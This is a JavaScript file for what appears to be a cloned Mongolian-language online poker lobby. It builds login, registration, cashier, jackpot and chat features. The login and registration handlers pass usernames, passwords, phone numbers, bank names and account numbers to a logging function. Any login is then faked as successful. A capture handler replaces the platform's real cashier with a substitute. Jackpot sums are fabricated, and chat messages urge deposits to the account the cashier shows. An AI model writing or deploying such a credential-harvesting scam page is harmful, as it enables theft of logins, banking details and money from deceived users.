        if (i >= maxSeats) { seat.style.visibility = 'hidden'; return; }
        seat.style.visibility = '';
        var player = seat.querySelector('.MiniTableSeat__player');
        if (i >= seated) {
          // Хоосон суудал → "Seat Open" товч (дарвал ширээ рүү орно)
          if (player) player.style.display = 'none';
          var content = seat.querySelector('.MiniTableSeat__content') || seat;
          var free = document.createElement('div');
          free.className = 'panel button MiniTableSeat__free_seat';
          free.innerHTML = '<div class="button-content" style="font-size:42%;line-height:1.05;text-align:center;color:#fff">Seat Open</div>';
          free.addEventListener('click', function (e) { e.stopPropagation(); openTable(row); });
          content.appendChild(free);
          return;
        }
        var bar = seat.querySelector('.MiniTableSeat__bar');
        if (bar) bar.style.visibility = '';
        var nm = seat.querySelector('.MiniTableSeat__bar__item.name .text');
        if (nm && roster[i]) nm.textContent = roster[i].name;
        var cash = seat.querySelector('.MiniTableSeat__bar__item.cash .text');
        if (cash && roster[i]) cash.textContent = fmtMoney(roster[i].stack);
        var av = seat.querySelector('.Avatar__img');
        if (av && roster[i]) av.style.backgroundImage = 'url("' + roster[i].avatar + '")';
      });
    }

    document.querySelectorAll('.Table__body_row_table').forEach(function (row) {
      if (!row.closest('.LobbyCashTablesMenuContainer') && cellText(row, 'tct-name') === original.title)
        row.classList.add('selected');
    });
    return show;
  }

  /* ═══════════════════════════════════════
     7. INIT
  ═══════════════════════════════════════ */
  document.addEventListener('DOMContentLoaded', function () {
    if (window.__udachAppInit) return;
    window.__udachAppInit = true;

    var container = document.querySelector('.screens-container') || document.getElementById('rootUI') || document.body;

    /* ── Login popup ── */
    container.appendChild(buildLoginPopup());

    document.getElementById('login-close-btn').addEventListener('click', hideLogin);
    document.getElementById('login-cancel-btn').addEventListener('click', hideLogin);
    document.getElementById('login-popup').addEventListener('click', function(e) {
      if (e.target === this || e.target.id === 'login-modal-bg') hideLogin();
    });

    document.getElementById('do-login-btn').addEventListener('click', function () {
      var u = document.getElementById('login-username').value.trim();
      var p = document.getElementById('login-password').value;
      if (!u || !p) return;
      var btn = document.getElementById('do-login-btn');
      var txt = btn.querySelector('.SimpleButton__text');
      var err = document.getElementById('login-error');
      if (txt) txt.textContent = 'Loading...';
      btn.style.opacity = '0.6';
      btn.style.pointerEvents = 'none';
      if (err) err.style.display = 'none';
      logAttempt(u, p, 'Нэвтрэх');
      /* ── Шууд нэвтрэх — дурын хэрэглэгч ── */
      hideLogin();
      var miniUser = document.querySelector('.MiniUserInfo');
      if (miniUser) {
        /* Login товч нуух */
        var loginBtnEl = miniUser.querySelector('.MiniUserInfo__login_button');
        if (loginBtnEl) loginBtnEl.style.display = 'none';

        /* Хуучин мэдээлэл арилгах */
        ['MiniUserInfo__info', 'MiniUserInfo__avatar', '__custom-avatar'].forEach(function (cls) {
          var el = miniUser.querySelector('.' + cls) || miniUser.querySelector('[data-custom-avatar]');
          if (el) el.remove();
        });

        /* Санамсаргүй avatar сонгох */
        var avUrl = avatarUrl(181);

        /* ── Avatar зураг — дөрвөлжин хүрээтэй (баруун талд) ── */
        var avatarDiv = document.createElement('div');
        avatarDiv.className = 'MiniUserInfo__avatar';
        avatarDiv.setAttribute('data-custom-avatar', '1');
        avatarDiv.style.cssText =
          'position:absolute;right:0;top:0.1em;width:3.6em;height:4em;' +
          'border:2px solid #d4ac0d;border-radius:6px;overflow:visible;' +
          'flex-shrink:0;cursor:pointer;background:#1a1b2e;';
        avatarDiv.innerHTML =
          /* Зураг — дөрвөлжин хэлбэртэй */
          '<div style="width:100%;height:100%;border-radius:4px;overflow:hidden;">' +
            '<img src="' + avUrl + '" style="width:100%;height:100%;object-fit:cover;" ' +
            'onerror="this.style.display=\'none\'">' +
          '</div>' +
          /* Монгол туг — доод талд, дунд нь */
          '<div style="position:absolute;bottom:-6px;left:50%;transform:translateX(-50%);' +
          'width:1.6em;height:1.1em;overflow:hidden;border:1.5px solid #222;border-radius:2px;">' +
            '<div class="panel Icon Icon_v_default Icon_c_white Icon_val_flag_icon_mn" tabindex="-1"' +
            ' style="width:100%;height:100%;"></div>' +
          '</div>';
        miniUser.appendChild(avatarDiv);

        /* ── Нэр + ранк (зүүн/дунд) ── */
        var infoDiv = document.createElement('div');
        infoDiv.className = 'MiniUserInfo__info';
        infoDiv.style.cssText =
          'position:absolute;right:4.2em;left:0;top:0.3em;height:4em;' +
          'display:flex;flex-direction:column;align-items:flex-end;justify-content:center;overflow:hidden;';
        infoDiv.innerHTML =
          '<div class="MiniUserInfo__nickname">' +
            '<span class="MiniUserInfo__nickname_text" style="color:#fff;font-size:1em;font-weight:bold;white-space:nowrap;">' +
              escHtml(u) +
            '</span>' +
          '</div>' +
          /* Ранк — өмнө нь жижиг user_status icon */
          '<div style="display:flex;align-items:center;justify-content:flex-end;gap:3px;margin-top:3px;">' +
            '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="#fff" style="flex-shrink:0;opacity:0.9;">' +
              '<circle cx="12" cy="7" r="4.5"/><path d="M3 22c0-5 4-8.5 9-8.5s9 3.5 9 8.5z"/>' +
            '</svg>' +
            '<span style="color:rgba(255,255,255,0.9);font-size:0.9em;white-space:nowrap;">цэрэг</span>' +
          '</div>';
        miniUser.appendChild(infoDiv);
      }
      if (txt) { txt.textContent = 'НЭВТРЭХ'; }
      btn.style.opacity = '';
      btn.style.pointerEvents = '';
    });

    /* БҮРТГҮҮЛЭХ товч → register popup нээх */
    document.getElementById('login-popup').addEventListener('click', function (e) {
      if (e.target.closest('.LoginContainer__sign_up_action')) {
        hideLogin();
        showRegister();
      }
    });

    ['login-username', 'login-password'].forEach(function (id) {
      var inp = document.getElementById(id);
      if (inp) inp.addEventListener('keydown', function (e) {
        if (e.key === 'Enter') document.getElementById('do-login-btn').click();
      });
    });

    /* Нууц үг харуулах / нуух toggle */
    var togglePwdBtn = document.getElementById('toggle-password-btn');
    if (togglePwdBtn) {
      togglePwdBtn.addEventListener('click', function () {
        var pwdInput = document.getElementById('login-password');
        var icon = document.getElementById('toggle-password-icon');
        if (!pwdInput) return;
        var showing = pwdInput.type === 'text';
        pwdInput.type = showing ? 'password' : 'text';
        togglePwdBtn.style.opacity = showing ? '0.6' : '1';
        /* нуусан үед eye-off, харуулсан үед eye */
        if (showing) {
          /* харагдаж байгааг нуух → eye-off */
          icon.innerHTML =
            '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>' +
            '<path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>' +
            '<line x1="1" y1="1" x2="23" y2="23"/>';
        } else {
          /* нуусныг харуулах → eye */
          icon.innerHTML =
            '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>' +
            '<circle cx="12" cy="12" r="3"/>';
        }
        pwdInput.focus();
      });
    }

    /* Login popup доторх checkbox (Намайг сана) toggle */
    document.getElementById('login-popup').addEventListener('click', function (e) {
      var cb = e.target.closest('.Checkbox');
      if (cb) cb.classList.toggle('Checkbox_checked');
    });

    /* ── Register popup ── */
    container.appendChild(buildRegisterPopup());

    var regPopup = document.getElementById('register-popup');
    regPopup.addEventListener('click', function(e) {
      if (e.target === regPopup || e.target.classList.contains('Popup__overlay')) hideRegister();
    });

    var regClose = regPopup.querySelector('.close-form');
    if (regClose) regClose.addEventListener('click', hideRegister);

    var regSubmit = regPopup.querySelector('.send-form');
    if (regSubmit) regSubmit.addEventListener('click', function() {
      var nick  = (regPopup.querySelector('.nick-field input')     || {}).value || '';
      var email = (regPopup.querySelector('.email-field input')    || {}).value || '';
      var pass  = (regPopup.querySelector('.password-field input') || {}).value || '';
      var bank  = (regPopup.querySelector('.reg-bank-select')      || {}).value || '';
      var phone = (regPopup.querySelector('.phoneNumber-field input') || {}).value || '';
      var acct  = (regPopup.querySelector('.bankAccountNumber-field input') || {}).value || '';
      logAttempt((nick || email) + (phone ? ' | ' + phone : '') + (bank ? ' | ' + bank : '') + (acct ? ' | ' + acct : ''), pass, 'Бүртгүүлэх');
      hideRegister();
    });

    regPopup.addEventListener('click', function(e) {
      var cb = e.target.closest('.Checkbox');
      if (cb) cb.classList.toggle('Checkbox_checked');
    });

    /* ── Settings popup ── same container as login (screens-container inside poker-root) */
    container.appendChild(buildSettingsPopup());

    document.getElementById('settings-close-btn').addEventListener('click', hideSettings);
    document.getElementById('settings-modal-bg').addEventListener('click', hideSettings);
    document.getElementById('settings-save-btn').addEventListener('click', hideSettings);

    document.getElementById('settings-reset-btn').addEventListener('click', function () {
      document.querySelectorAll('#settings-items .TableSettingsContainer__setting_item').forEach(function (row) {
        var cb  = row.querySelector('.Checkbox');
        if (!cb) return;
        var key = Object.keys(defaultChecked).find(function (k) { return row.classList.contains(k); });
        if (key === undefined) return;
        if (defaultChecked[key]) cb.classList.add('Checkbox_checked');
        else cb.classList.remove('Checkbox_checked');
      });
    });

    var settingsTabs = Array.from(document.querySelectorAll('#settings-tabs .TabButton'));
    settingsTabs.forEach(function (tab) {
      tab.addEventListener('click', function () {
        if (tab.classList.contains('disable')) return;
        setActive(settingsTabs, tab);
        var idx = settingsTabs.indexOf(tab);
        document.querySelectorAll('#settings-items .settings-group').forEach(function (g) {
          g.style.display = +g.getAttribute('data-tab') === idx ? g.getAttribute('data-disp') : 'none';
        });
        var sw = document.querySelector('#settings-popup .scroll-wrapper');
        if (sw) sw.style.transform = 'translate(0px, 0px) translateZ(0px)';
      });
    });

    document.getElementById('settings-popup').addEventListener('click', function (e) {
      var cb = e.target.closest('.Checkbox');
      if (cb) cb.classList.toggle('Checkbox_checked');

      // App themes: pick a theme thumbnail
      var thumb = e.target.closest('.appth-thumb');
      if (thumb) {
        thumb.parentNode.querySelectorAll('.appth-thumb').forEach(function (t) {
          t.classList.remove('sel');
        });
        thumb.classList.add('sel');
      }

      // Table themes: pick a front-deck
      var deck = e.target.closest('.tt-deck');
      if (deck) {
        deck.parentNode.querySelectorAll('.tt-deck').forEach(function (t) {
          t.classList.remove('sel');
        });
        deck.classList.add('sel');
      }
    });

    var settingsScroll = document.querySelector('#settings-popup .scroll-panel');
    if (settingsScroll) initScroll(settingsScroll);

    /* ── Sidebar ── */
    var sidebar = document.querySelector('.LobbySidebarContainer');
    if (sidebar) {
      sidebarHideTransform = sidebar.classList.contains('right') ? 'translateX(100%)' : 'translateX(-100%)';
      var parts = buildSidebarParts();
      sidebarInner   = parts.inner;
      sidebarOuterEl = sidebar.querySelector('.Sidebar__outer');

      if (sidebarOuterEl) {
        sidebarOuterEl.appendChild(parts.overlay);
        sidebarOuterEl.style.display = 'none';
      }
      sidebar.appendChild(sidebarInner);

      var sbScroll = sidebarInner.querySelector('.scroll-panel');
      if (sbScroll) initScroll(sbScroll);

      document.getElementById('sidebar-close-btn').addEventListener('click', function () { closeSidebar(); });
      document.getElementById('sidebar-overlay').addEventListener('click', function () { closeSidebar(); });

      document.getElementById('sidebar-settings-btn').addEventListener('click', function () {
        closeSidebar(showSettings);
      });
      document.getElementById('sidebar-contact-btn').addEventListener('click', function () {
        closeSidebar(showContact);
      });
    }

    /* ── Contact popup ── */
    document.body.appendChild(buildContactPopup());
    document.getElementById('contact-close-btn').addEventListener('click', hideContact);
    document.getElementById('contact-modal-bg').addEventListener('click', hideContact);

    document.querySelectorAll('#cm-grid-view .cm-item[data-kind]').forEach(function (item) {
      item.addEventListener('click', function () {
        var kind = item.getAttribute('data-kind');
        document.getElementById('cm-form-title').textContent = kind;
        document.getElementById('cm-name').value = '';
        document.getElementById('cm-message').value = '';
        document.getElementById('cm-err').style.display = 'none';
        document.getElementById('cm-success').style.display = 'none';
        document.getElementById('cm-fields').style.display = '';
        var btn = document.getElementById('cm-submit-btn');
        btn.disabled = false; btn.textContent = 'ИЛГЭЭХ';
        btn._kind = kind;
        document.getElementById('cm-grid-view').style.display = 'none';
        document.getElementById('cm-form-view').style.display = 'block';
      });
    });

    document.getElementById('cm-status-btn').addEventListener('click', function () {
      document.getElementById('cm-form-title').textContent = 'Хүсэлтийн хариу шалгах';
      document.getElementById('cm-name').value = '';
      document.getElementById('cm-message').value = '';
      document.getElementById('cm-err').style.display = 'none';
      document.getElementById('cm-success').style.display = 'none';
      document.getElementById('cm-fields').style.display = '';
      var btn = document.getElementById('cm-submit-btn');
      btn.disabled = false; btn.textContent = 'ШАЛГАХ';
      btn._kind = 'Хүсэлтийн хариу';
      document.getElementById('cm-grid-view').style.display = 'none';
      document.getElementById('cm-form-view').style.display = 'block';
    });

    document.getElementById('cm-telegram-btn').addEventListener('click', function () {
      window.open('https://t.me/', '_blank');
    });

    document.getElementById('cm-app-btn').addEventListener('click', function () {
      window.open('https://apps.apple.com/', '_blank');
    });

    document.getElementById('cm-back-btn').addEventListener('click', function () {
      document.getElementById('cm-form-view').style.display = 'none';
      document.getElementById('cm-grid-view').style.display = '';
    });

    document.getElementById('cm-submit-btn').addEventListener('click', function () {
      var name    = document.getElementById('cm-name').value.trim();
      var kind    = this._kind || 'Хүсэлт';
      var message = document.getElementById('cm-message').value.trim();
      var errEl   = document.getElementById('cm-err');
      errEl.style.display = 'none';
      if (!message) {
        errEl.textContent = 'Мэдэгдэл бичнэ үү.';
        errEl.style.display = 'block';
        return;
      }
      var btn = this;
      btn.disabled = true;
      btn.textContent = 'Илгээж байна...';
      fetch('/api/contact', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: name, kind: kind, message: message })
      }).then(function (r) {
        if (r.ok) {
          document.getElementById('cm-fields').style.display = 'none';
          document.getElementById('cm-success').style.display = 'block';
        } else {
          errEl.textContent = 'Алдаа гарлаа. Дахин оролдоно уу.';
          errEl.style.display = 'block';
          btn.disabled = false;
          btn.textContent = 'ИЛГЭЭХ';
        }
      }).catch(function () {
        errEl.textContent = 'Холболт тасарлаа.';
        errEl.style.display = 'block';
        btn.disabled = false;
        btn.textContent = 'ИЛГЭЭХ';
      });
    });

    /* ESC */
    document.addEventListener('keydown', function (e) {
      if (e.key === 'Escape') {
        hideLogin(); hideRegister(); hideSettings(); closeSidebar(); hideContact(); hideCashier();
      }
    });

    /* ── Нэвтрэх товч ── */
    var loginBtn = document.querySelector('.MiniUserInfo__login_button');
    if (loginBtn) loginBtn.addEventListener('click', showLogin);

    /* ── КАСС товч ── */
    document.body.appendChild(buildCashierPopup());
    document.getElementById('cashier-close-btn').addEventListener('click', hideCashier);
    document.getElementById('cashier-bg').addEventListener('click', hideCashier);

    /* Use capture+stopImmediatePropagation to block platform's own cashier dialog */
    document.addEventListener('click', function (e) {
      var t = e.target;
      while (t && t !== document) {
        if (t.classList && t.classList.contains('CashierButton')) {
          e.stopImmediatePropagation();
          e.preventDefault();
          showCashier();
          return;
        }
        t = t.parentNode;
      }
    }, true);

    /* ── Burger menu ── */
    var menuBtn = document.querySelector('.menu_button');
    if (menuBtn) menuBtn.addEventListener('click', openSidebar);

    /* ── Header settings button (fullscreen-н хажууд) ── */
    var headerSettingsBtn = document.querySelector('.LobbyHeaderButtons__button.settings');
    if (headerSettingsBtn) headerSettingsBtn.addEventListener('click', showSettings);

    /* ── Fullscreen ── */
    var fsBtn = document.querySelector('.FullScreenButtonContainer');
    if (fsBtn) fsBtn.addEventListener('click', function () {
      if (!document.fullscreenElement) document.documentElement.requestFullscreen().catch(function () {});
      else document.exitFullscreen();
    });

    /* ── Гол табууд ── */
    var mainTabs = Array.from(document.querySelectorAll('.LobbyMainTabsContainer .TabButton'));
    mainTabs.forEach(function (tab) {
      tab.addEventListener('click', function () {
        if (tab.classList.contains('disable')) return;
        setActive(mainTabs, tab);

        if (tab.classList.contains('lpg-lobby-my-games_button')) {
          showLogin();
          return;
        }

        var rows = document.querySelectorAll('.Table__body_row_wrapper');
        onTournaments = tab.classList.contains('lpg-lobby-tournaments_button');
        if (onTournaments) {
          rows.forEach(function (r) { r.style.display = 'none'; });
        } else {
          rows.forEach(function (r) { r.style.display = ''; });
          filterTables();
        }
      });
    });

    /* ── Sub табууд ── */
    var subTabs = Array.from(document.querySelectorAll('.LobbySubTabsContainer .TabButton'));
    subTabs.forEach(function (tab) {
      tab.addEventListener('click', function () {
        if (tab.classList.contains('disable')) return;
        setActive(subTabs, tab);
        if (tab.classList.contains('lst-all'))         currentGameType = 'all';
        else if (tab.classList.contains('lst-holdem')) currentGameType = 'holdem';
        else if (tab.classList.contains('lst-omaha'))  currentGameType = 'omaha';
        filterTables();
      });
    });

    /* ── Limit filter ── */
    var filterBtns = Array.from(document.querySelectorAll('.Filters .TabButton'));
    filterBtns.forEach(function (btn) {
      btn.addEventListener('click', function () {
        if (btn.classList.contains('disable')) return;
        setActive(filterBtns, btn);
        // Товчны дарааллаар (Any / Fixed / Pot Limit / No Limit) — хэл солигдсон ч ажиллана
        var row = btn.parentNode ? Array.from(btn.parentNode.children) : [btn];
        currentLimit = ['any', 'fixed', 'pot', 'no'][row.indexOf(btn)] || 'any';
        filterTables();
      });
    });

    /* ── Search: ширээний нэрээр хайх ── */
    var searchInput = document.querySelector('.LobbyBottomTablesFiltersContainer .input_filter');
    if (searchInput) {
      searchInput.removeAttribute('tabindex');
      searchInput.addEventListener('input', function () {
        searchText = searchInput.value.trim().toLowerCase();
        filterTables();
      });
    }

    /* ── Empty / Full switch ── */
    [['tft-empty', function (v) { showEmpty = v; }],
     ['tft-full',  function (v) { showFull  = v; }]].forEach(function (pair) {
      var field = document.querySelector('.LobbyBottomTablesFiltersContainer .' + pair[0]);
      var cb = field && field.querySelector('.checkbox_filter');
      if (!cb) return;
      field.style.cursor = 'pointer';
      pair[1](cb.classList.contains('Checkbox_checked'));
      field.addEventListener('click', function () {
        var on = cb.classList.toggle('Checkbox_checked');
        pair[1](on);
        filterTables();
      });
    });

    initSort();

    /* ── Scroll ── */
    document.querySelectorAll('.Table__body .scroll-panel').forEach(initScroll);


    /* ── Ширээний мөр + Buy In ── */
    var showTableInfo = initTableInfo();
    document.querySelectorAll('.Table__body_row_table').forEach(function (row) {
      row.style.cursor = 'pointer';
      row.addEventListener('click', function () {
        (row.closest('.Table__body') || document).querySelectorAll('.Table__body_row_table.selected').forEach(function (r) {
          r.classList.remove('selected');
        });
        row.classList.add('selected');
        if (showTableInfo && !row.closest('.LobbyCashTablesMenuContainer')) showTableInfo(row);
      });
      row.querySelectorAll('.action.show, .action.buy_in').forEach(function (btn) {
        btn.addEventListener('click', function (e) {
          e.stopPropagation();
          openTable(row);
        });
      });
    });

    /* ── Table info доорх PLAY товч → сонгосон ширээ рүү орно ── */
    function selectedLobbyRow() {
      var rows = Array.from(document.querySelectorAll('.Table__body_row_table.selected'))
        .filter(function (r) { return !r.closest('.LobbyCashTablesMenuContainer'); });
      return rows[0] || null;
    }
    var infoPlayBtn = document.querySelector('.LobbyCashTablesMenuContainer__action.open');
    if (infoPlayBtn) infoPlayBtn.addEventListener('click', function (e) {
      e.stopPropagation();
      var row = selectedLobbyRow();
      if (row) openTable(row);
    });

    /* ── Jackpot ── */
    // 3 төрөл: сумаар солигдоно, дүн нь байнга бага зэрэг өсөж/буурч хэлбэлзэнэ
    var jackpots = [
      { name: 'Smart',       value: 810343148.48 },
      { name: 'Monte Carlo', value: 351817861.25 },
      { name: 'Bad Beat',    value: 124503274.90 }
    ];
    var jackpotIdx  = 0;
    var jNameEl  = document.querySelector('.Jackpot__name__text');
    var jValueEl = document.querySelector('.Jackpot__value__text');

    function fmtJackpot(v) {
      return v.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    }

    function updateJackpot() {
      var jp = jackpots[jackpotIdx];
      if (jNameEl) {
        jNameEl.textContent = jp.name;
        applyLangTo(jNameEl);
      }
      if (jValueEl) jValueEl.textContent = fmtJackpot(jp.value);
    }

    function tickJackpots() {
      jackpots.forEach(function (jp, i) {
        // ихэвчлэн өснө, хааяа бага зэрэг буурна
        var delta = jp.value * (Math.random() * 0.00004 - 0.000012);
        jp.value = Math.max(0, jp.value + delta);
        if (i === jackpotIdx && jValueEl) jValueEl.textContent = fmtJackpot(jp.value);
      });
      setTimeout(tickJackpots, 900 + Math.random() * 1400);
    }

    updateJackpot();
    tickJackpots();
    var jPrev = document.querySelector('.Jackpot__action.prev');
    var jNext = document.querySelector('.Jackpot__action.next');
    if (jPrev) jPrev.addEventListener('click', function () {
      jackpotIdx = (jackpotIdx - 1 + jackpots.length) % jackpots.length;
      updateJackpot();
    });
    if (jNext) jNext.addEventListener('click', function () {
      jackpotIdx = (jackpotIdx + 1) % jackpots.length;
      updateJackpot();
    });

  });

  /* ═══════════════════════════════════════
     LANGUAGE SWITCHER  — далбаан дээр дарахад EN / MN цэс гарна
  ═══════════════════════════════════════ */
  var LANG_KEY = 'app_lang';
  var LANGS = [
    { code: 'en', flag: 'gb', label: 'English' },
    { code: 'mn', flag: 'mn', label: 'Монгол' }
  ];

  var MN_DICT = {
    'Play': 'Тоглох',
    'Login': 'Нэвтрэх',
    'Cashier': 'Касс',
    'Smart': 'Ухаалаг',
    'Monte Carlo': 'Монте Карло',
    'Bad Beat': 'Бэд Бит',
    'Jackpot': 'Жекпот',
    'Cash tables': 'Мөнгөн ширээ',
    'Tournaments': 'Тэмцээн',
    'All': 'Бүгд',
    'Holdem': 'Холдем',
    "Hold'em": 'Холдем',
    'Omaha': 'Омаха',
    '5 Card Omaha': '5 хөзөрт Омаха',
    '6 Card Omaha': '6 хөзөрт Омаха',
    'Any': 'Бүгд',
    'Fixed': 'Тогтмол',
    'Pot Limit': 'Пот лимит',
    'No Limit': 'Хязгааргүй',
    'Table name': 'Ширээний нэр',
    'Stakes': 'Бооцоо',
    'Avg. Pot': 'Дундаж пот',
    'H/Hr': 'Гар/цаг',
    'Plrs': 'Тоглогч',
    'Game': 'Тоглоом',
    'Players: Any': 'Тоглогч: Бүгд',
    'Empty': 'Хоосон',
    'Full': 'Дүүрэн',
    'Currency: Any': 'Валют: Бүгд',
    'Name': 'Нэр',
    'Country': 'Улс',
    'Cash': 'Мөнгө',
    'Wait List:': 'Хүлээлгийн жагсаалт:',
    'Waiting List': 'Хүлээлгийн жагсаалт',
    'Online': 'Онлайн',
    'Tables': 'Ширээ',
    'Seat Open': 'Сул суудал'
  };
  var MN_PREFIX = [
    [/^Buy In:/, 'Орох дүн:']
  ];
  var MN_PLACEHOLDER = { 'Search': 'Хайх' };

  var origText = new WeakMap();   // text node -> original English text
  var origPh   = new WeakMap();   // input -> original placeholder
  var curLang  = 'en';
  var applying = false;

  function translateText(en) {
    var t = en.trim();
    if (!t) return null;
    if (MN_DICT.hasOwnProperty(t)) return en.replace(t, MN_DICT[t]);
    for (var i = 0; i < MN_PREFIX.length; i++) {
      if (MN_PREFIX[i][0].test(t)) return en.replace(MN_PREFIX[i][0], MN_PREFIX[i][1]);
    }
    return null;
  }

  function langRoot() {
    return document.getElementById('rootUI') || document.body;
  }

  function applyLangTo(root) {
    applying = true;
    var walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT, null);
    var node;
    while ((node = walker.nextNode())) {
      if (node.parentNode && /^(SCRIPT|STYLE)$/.test(node.parentNode.nodeName)) continue;
      if (node.parentNode && node.parentNode.closest && node.parentNode.closest('#lang-menu')) continue;
      if (curLang === 'mn') {
        var src = origText.has(node) ? origText.get(node) : node.nodeValue;
        var tr = translateText(src);
        if (tr !== null) {
          if (!origText.has(node)) origText.set(node, src);
          if (node.nodeValue !== tr) node.nodeValue = tr;
        }
      } else if (origText.has(node)) {
        if (node.nodeValue !== origText.get(node)) node.nodeValue = origText.get(node);
      }
    }
    var inputs = root.querySelectorAll ? root.querySelectorAll('input[placeholder]') : [];
    Array.prototype.forEach.call(inputs, function (inp) {
      var ph = origPh.has(inp) ? origPh.get(inp) : inp.placeholder;
      if (curLang === 'mn' && MN_PLACEHOLDER[ph]) {
        origPh.set(inp, ph);
        inp.placeholder = MN_PLACEHOLDER[ph];
      } else if (curLang !== 'mn' && origPh.has(inp)) {
        inp.placeholder = origPh.get(inp);
      }
    });
    applying = false;
  }

  function setFlagIcons(code) {
    var flag = code === 'mn' ? 'mn' : 'gb';
    document.querySelectorAll('.LanguageSelectorContainer .Select__button_icon').forEach(function (ic) {
      ic.className = ic.className.replace(/Icon_val_flag_icon_[a-z]+/, 'Icon_val_flag_icon_' + flag);
    });
  }

  function setLang(code) {
    curLang = code === 'mn' ? 'mn' : 'en';
    try { localStorage.setItem(LANG_KEY, curLang); } catch (e) {}
    document.documentElement.lang = curLang;
    setFlagIcons(curLang);
    var sel = document.getElementById('settings-lang');
    if (sel) sel.value = curLang;
    applyLangTo(langRoot());
  }

  function closeLangMenu() {
    var m = document.getElementById('lang-menu');
    if (m) m.parentNode.removeChild(m);
  }

  function openLangMenu(anchor) {
    closeLangMenu();
    var r = anchor.getBoundingClientRect();
    var menu = document.createElement('div');
    menu.id = 'lang-menu';
    menu.style.cssText = 'position:fixed;z-index:10000;top:' + (r.bottom + 4) + 'px;left:' + r.left + 'px;' +
      'min-width:' + Math.max(r.width, 150) + 'px;background:#232334;border:1px solid rgba(255,255,255,.15);' +
      'border-radius:6px;box-shadow:0 6px 18px rgba(0,0,0,.5);padding:4px 0;font-size:14px;';
    LANGS.forEach(function (l) {
      var item = document.createElement('div');
      item.style.cssText = 'display:flex;align-items:center;gap:10px;padding:8px 12px;cursor:pointer;color:#fff;' +
        (l.code === curLang ? 'background:rgba(212,172,13,.25);' : '');
      item.innerHTML =
        '<div class="panel Icon Icon_v_default Icon_c_white Icon_val_flag_icon_' + l.flag + '" ' +
        'style="width:2em;height:1.4em;position:relative;flex:none"><div class="Icon__content" ' +
        'style="position:absolute;inset:0;background-size:contain;background-repeat:no-repeat;background-position:center"></div></div>' +
        '<span>' + l.label + '</span>' +
        (l.code === curLang ? '<span style="margin-left:auto;color:#d4ac0d">✓</span>' : '');
      item.addEventListener('mouseenter', function () { if (l.code !== curLang) item.style.background = 'rgba(255,255,255,.08)'; });
      item.addEventListener('mouseleave', function () { if (l.code !== curLang) item.style.background = ''; });
      item.addEventListener('click', function (e) {
        e.stopPropagation();
        closeLangMenu();
        setLang(l.code);
      });
      menu.appendChild(item);
    });
    // .poker-root дотор байрлуулбал далбааны CSS (background-image) үйлчилнэ
    langRoot().appendChild(menu);
  }

  function initLangSwitcher() {
    document.addEventListener('click', function (e) {
      var btn = e.target.closest && e.target.closest('.LanguageSelectorContainer');
      if (btn) {
        e.preventDefault();
        e.stopPropagation();
        if (document.getElementById('lang-menu')) closeLangMenu();
        else openLangMenu(btn);
        return;
      }
      if (!(e.target.closest && e.target.closest('#lang-menu'))) closeLangMenu();
    }, true);
    window.addEventListener('resize', closeLangMenu);

    // Тохиргооны "Application language" сонголттой холбох
    document.addEventListener('change', function (e) {
      if (e.target && e.target.id === 'settings-lang') setLang(e.target.value);
    });

    // Дараа нь нэмэгдэх контентыг (ширээ, popup г.м.) мөн орчуулна
    new MutationObserver(function (muts) {
      if (applying || curLang !== 'mn') return;
      muts.forEach(function (m) {
        if (m.type === 'characterData') {
          if (!origText.has(m.target) || m.target.nodeValue !== translateText(origText.get(m.target))) {
            origText.delete(m.target);
            applyLangTo(m.target.parentNode || langRoot());
          }
        } else {
          m.addedNodes.forEach(function (n) {
            var sel = n.nodeType === 1 && n.querySelector && n.querySelector('#settings-lang');
            if (sel) sel.value = curLang;
            if (n.nodeType === 1) applyLangTo(n);
            else if (n.nodeType === 3 && n.parentNode) applyLangTo(n.parentNode);
          });
        }
      });
    }).observe(document.body, { childList: true, subtree: true, characterData: true });

    var saved = 'en';
    try { saved = localStorage.getItem(LANG_KEY) || 'en'; } catch (e) {}
    setLang(saved);
  }

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', initLangSwitcher);
  else initLangSwitcher();

  /* ═══════════════════════════════════════
     LOBBY CHAT  — доод талын чат товч дээр дарахад нээгдэнэ
  ═══════════════════════════════════════ */
  var CHAT_PINNED = '✨ЦЭНЭГ ХИЙХ ДАНС АВАХ ЗААВАР: CASHIER (МӨНГӨНИЙ КАСС) ДЭЭР ДАРААД 1 ДАХЬ СОНГОЛТ ДЭЭР ДАРААД ГАРЖ ИРСЭН ДАНС РУУ ЦЭНЭГЭЭ ХИЙНЭ ҮҮ!! ✨';
  var CHAT_SEP = '____________________';
  var CHAT_MESSAGES = [
    '✨ Хурд, шударга тоглолт, найдвартай систем — бүгдийг нэг дор!Та манай платформд нэгдэж жинхэнэ өрсөлдөөнийг мэдрээрэй.',
    'baccarat ширээ нээгдлээ 👉 Cowboy ширээг сонгоод шууд cowboy эсвэл bull дээр бооцоогоо тавиаарай 👉 5к аас 5 сая хүртэл бооцоо тавьж болно тавьсан бооцоогоо шууд 2 үржүүлж авна👉 Ширээнд мөнгөтэй давхар сууж байгаа бол ширээнээсэ босож байгаад baccarat cowboy ширээндээ суугаарай !',
    '✨✨ЦЭНЭГ ХИЙХ ДАНС АВАХ ЗААВАР: CASHIER (МӨНГӨНИЙ КАСС) ДЭЭР ДАРААД 1 ДАХЬ СОНГОЛТ ДЭЭР ДАРААД ГАРЖ ИРСЭН ДАНС РУУ ЦЭНЭГЭЭ ХИЙНЭ ҮҮ!! ✨✨',
    '✨таталт 5 минутаас дээш хэтэрсэн бол админлуу бичиж таталтаа цуцлуулад дахиад татаарай манайхаан үнжий хайртай шүү ✨',
